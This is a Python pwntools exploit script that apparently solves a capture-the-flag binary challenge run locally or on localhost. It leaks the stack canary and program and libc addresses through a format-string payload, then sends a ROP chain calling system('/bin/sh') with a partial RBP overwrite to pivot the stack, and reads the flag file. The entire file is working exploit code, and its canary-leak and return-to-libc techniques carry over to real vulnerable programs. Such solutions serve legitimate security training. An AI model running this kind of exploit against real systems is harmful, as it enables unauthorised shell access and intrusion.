#!/usr/bin/env python3.8

from pwn import *
import warnings
import re
# import time

# Allows you to switch between local/GDB/remote from terminal
def connect():
    if args.GDB:
        r = gdb.debug(elf.path, gdbscript=gdbscript)
    elif args.REMOTE:
        r = remote("localhost", 1569)
    else:
        r = process([elf.path])
    return r

# Specify GDB script here (breakpoints etc)
gdbscript = """
    set follow-fork-mode child
    start
    b *vuln+195
"""

# Binary filename
exe = '../Source/chall'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# =======================
# EXPLOIT AFTER THIS
# =======================
r = connect()
libc = ELF("../Source/libc.so.6", checksec=False)

buf_offset = 96
libc_offset = 172490
prog_offset = 4921
overwrite_value = 0x8e41414141414141
expected_length = 25
pop_rdi_offset = 0x10f75b # in libc

r.sendlineafter(": ", str(overwrite_value))
r.sendlineafter("?\n", str(expected_length))

payload = "%13$p%14$p%15$p%21$p" # leak canary, stack, prog, libc
r.sendlineafter("?\n", payload)

resp = r.recvline().strip()
print(f"Leaks: {resp}")
resp = resp.split(b"0x")[1:] # ignore the first empty list element
# print(resp)
CANARY = int(resp[0], 16)
stack_leak = int(resp[1], 16)
prog_leak = int(resp[2], 16)
libc_leak = int(resp[3], 16)

buf_addr = stack_leak - buf_offset
prog_base = prog_leak - prog_offset
libc_base = libc_leak - libc_offset
libc.address = libc_base
print(f"buf: {hex(buf_addr)}, prog_base: {hex(prog_base)}, libc_base: {hex(libc_base)}")
BIN_SH = next(libc.search(b"/bin/sh\x00"))
SYSTEM = libc.symbols['system']
POP_RDI = libc_base + pop_rdi_offset
print(f"/bin/sh: {hex(BIN_SH)}, system: {hex(SYSTEM)}, pop_rdi_ret: {hex(POP_RDI)}")

RBP = (buf_addr + 8) & 0xffff # overwrite RBP with buf+8
# final payload to be executed after pivoting
payload = p64(CANARY) # for canary check in main
payload += p64(buf_addr) # new RBP before final return, needed for one_gadget but not for system("/bin/sh")
payload += p64(POP_RDI)
payload += p64(BIN_SH)
payload += p64(SYSTEM)
payload += p64(CANARY) # for canary check in vuln
payload += p16(RBP) # overwrite last two bytes of RBP
r.sendlineafter("?\n", payload)

r.sendline("cat flag.txt")
resp = r.recvall(timeout=2)
print(resp)

r.close()
# r.interactive()